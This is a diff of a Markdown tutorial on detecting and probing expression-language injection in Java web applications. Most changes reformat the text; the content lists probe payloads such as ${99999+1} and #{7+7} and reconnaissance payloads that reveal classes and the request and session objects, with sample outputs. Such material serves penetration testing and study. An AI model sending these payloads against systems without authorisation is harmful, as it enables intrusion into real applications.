@@ -54,9 +54,9 @@ In a black box testing scenario finding these vulnerabilities can be done by sen
 
 Such as:
 
-- list  ${&quot;aaaa&quot;} (the literal string &quot;aaaa&quot;) and then searching the response text for such data.
-- list  ${99999+1} and then searching the response text for 100000.
-- list  #{7+7} or ${{7\*7}} and then searching the response text for 49.
+-   ${&quot;aaaa&quot;} (the literal string &quot;aaaa&quot;) and then searching the response text for such data.
+-   ${99999+1} and then searching the response text for 100000.
+-   #{7+7} or ${{7\*7}} and then searching the response text for 49.
 
   ![](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png )
 
@@ -66,35 +66,37 @@ In above example, anything between expression delimiters {{ }} will be evaluated
 
 Once it is confirmed that anything between expression delimiters is evaluated from this point we can send payloads to start gathering more information.
 
-Convert string to Uppercase:
-```
-Payload: ${{&#39;abc&#39;.toUpperCase()}}
-
+## Convert string to Uppercase:
+```java
+Payload: ${{'abc'.toUpperCase()}}
 Output: ABC
 ```
-Concatenate two strings.
-```
-Payload: ${{&#39;abc&#39;.concat(&#39;def&#39;)}}
 
+## Concatenate two strings.
+```java
+Payload: ${{'abc'.concat('def')}} 
 Output: abcdef
 ```
-Get the class name of string.
-```
-Payload: ${{&#39;a&#39;.getClass()}}
+
+## Get the class name of string.
+```java
+Payload: ${{'a'.getClass()}} 
 
 Output: java.lang.String
 ```
  
 
-There are some built in variables such as {{ request }}, {{ session }},{{ faceContex }}
+There are some built in variables such as **{{ request }}**, **{{ session }}**,**{{ faceContex }}**
 
-Get the class of request object
+## Get the class of request object
 ```
 Payload: ${{ request }}
 
 Output: [org.apache.catalina.connector.RequestFacade@316732da]
 ```
-Get the class of session object
+
+
+## Get the class of session object
 ```
 Payload: ${{ session }}
 
